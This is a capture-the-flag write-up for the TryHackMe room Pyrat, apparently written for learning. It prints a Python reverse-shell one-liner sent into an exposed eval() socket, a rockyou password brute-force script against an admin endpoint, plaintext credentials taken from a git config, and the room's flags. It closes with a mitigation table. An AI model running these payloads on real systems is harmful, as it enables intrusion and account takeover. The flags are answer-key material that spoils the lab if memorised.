# CTF Write-Up: [Pyrat](https://tryhackme.com/room/pyrat)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`996bdb1f619a68361417cabca5454705`

</details>

<details>
<summary>Root Flag</summary>

`ba5ed03e9e74bb98054438480165e221`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

### Detailed Nmap Scan

```bash
nmap -vv -oN Nmap/Detailed -p 22,8000 -A <IP_ADDRESS>
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 | Ubuntu 4ubuntu0.13 |
| 8000 | HTTP (alt) | SimpleHTTP/0.6 Python/3.11.2 | ⚠️ Responds to raw TCP — possible eval() exposure |

Port 8000 immediately raised suspicion. Nmap's service fingerprinting returned Python `NameError` exceptions in response to standard HTTP probes — errors like `name 'GET' is not defined` and `name 'OPTIONS' is not defined`. This indicated the server was passing raw TCP input directly into a Python `eval()` call rather than handling HTTP properly.

Visiting `http://<IP_ADDRESS>:8000/` in a browser returned a single telling hint: **"Try a more basic connection!"**

### Web Enumeration (Gobuster)

```bash
gobuster dir -u http://<IP_ADDRESS>:8000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

Gobuster quickly hit a dead end — every path returned HTTP 200 with an identical 27-byte response body. This confirmed the server was not a conventional web application. The real attack surface was the raw TCP socket itself.

---

## 2. Initial Access — Python eval() RCE

Connecting via netcat instead of a browser confirmed the suspicion immediately:

```bash
nc <IP_ADDRESS> 8000
print("hello")
# hello
```

The server was evaluating raw input as Python code. A one-liner reverse shell was sent directly into the socket:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<tun0>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```

With a listener running on the attacking machine:

```bash
nc -lvnp 4444
```

A shell was received as `www-data`.

### Shell Stabilisation

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

✅ Shell as `www-data`.

---

## 3. Credential Discovery — Git Config

Enumerating the filesystem, a git repository was found at `/opt/dev/`. The working directory was empty — no committed source files — but the `.git/config` contained something valuable:

```bash
cat /opt/dev/.git/config
```

```ini
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

Plaintext GitHub credentials stored directly in the git config. Password reuse was immediately tested against the local user `think`:

```bash
su think
# Password: _TH1NKINGPirate$_
```

✅ Lateral movement to `think` succeeded.

---

## 4. User Flag

```bash
think@ip-10-48-160-93:~$ cat ~/user.txt
996bdb1f619a68361417cabca5454705
```

---

## 5. Privilege Escalation — Admin Endpoint + Password Fuzzing

`sudo -l` returned no results for `think`. Attention turned back to the Pyrat application. The git repository had only a single commit:

```bash
cd /opt/dev
git log --oneline
# 0a3c36d (HEAD -> master) Added shell endpoint

git show HEAD | cat
```

The commit introduced a file called `pyrat.py.old`, which contained the server's routing logic:

```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if not approved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)
```

Two endpoints were visible: `shell` (already used for the initial foothold) and a second privileged endpoint that executes **as root before downgrading**. The placeholder name `some_endpoint` was clearly obfuscated — the real name required fuzzing.

### Step 1: Identify the Endpoint

Manually testing `admin` in a fresh netcat session returned a `Password:` prompt, confirming the endpoint name without needing a wordlist:

```bash
nc <IP_ADDRESS> 8000
admin
# Password:
```

### Step 2: Fuzz the Password

A custom Python script was written to brute-force the password against the `admin` endpoint using `rockyou.txt`. The key filter: a wrong password causes the server to re-send `Password:`, while a correct one returns a different response entirely.

```python
import socket

target = "<IP_ADDRESS>"
port = 8000

with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
    for line in f:
        password = line.strip().decode(errors="ignore")
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, port))
            s.send(b"admin\n")
            s.recv(1024)  # discard the "Password:" prompt
            s.send(password.encode() + b"\n")
            response = s.recv(1024).decode(errors="ignore")
            if "password" not in response.lower() and "wrong" not in response.lower() and response.strip():
                print(f"[+] Password found: {password} -> {repr(response)}")
                break
            s.close()
        except:
            pass
```

```
[+] Password found: abc123 -> 'Welcome Admin!!! Type "shell" to begin\n'
```

### Step 3: Root Shell

```bash
nc <IP_ADDRESS> 8000
admin
# Password:
abc123
# Welcome Admin!!! Type "shell" to begin
shell
# whoami
# root
```

✅ Root shell obtained.

---

## 6. Root Flag

```bash
root@ip-10-48-160-93:~# cat /root/root.txt
ba5ed03e9e74bb98054438480165e221
```

---

## 7. Attack Chain

```
Nmap Scan
    └─► Port 22 (SSH), Port 8000 (Python eval() server masquerading as HTTP)

Raw netcat connection to port 8000
    └─► Python eval() RCE → reverse shell as www-data

/opt/dev/.git/config credential leak
    └─► think:_TH1NKINGPirate$_ → su think → user.txt

git show HEAD → pyrat.py.old source code
    └─► Privileged "admin" endpoint discovered

rockyou.txt password fuzzing against admin endpoint
    └─► admin:abc123 → Welcome Admin! → shell → root

cat /root/root.txt → root flag
```

---

## 8. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | Raw Python `eval()` exposed over TCP | Unauthenticated RCE as `www-data` | Never expose an eval interface over the network; use a proper application framework |
| 2 | Plaintext credentials stored in `.git/config` | Credentials harvested by any low-privilege user | Use a secrets manager; never store credentials in version control config files |
| 3 | Password reuse across GitHub and local system account | Lateral movement from `www-data` to `think` | Enforce unique passwords per service; prefer SSH key authentication for system accounts |
| 4 | Weak admin password (`abc123`) on privileged endpoint | Root shell obtained via brute-force | Enforce strong passwords; implement rate limiting and account lockout on auth endpoints |
| 5 | Privileged admin endpoint exposed on the same public socket as the eval server | Successful auth leads directly to a root shell | Bind admin interfaces to loopback only; separate privileged and unprivileged services |

---

*Pyrat — TryHackMe | Rooted ✅*
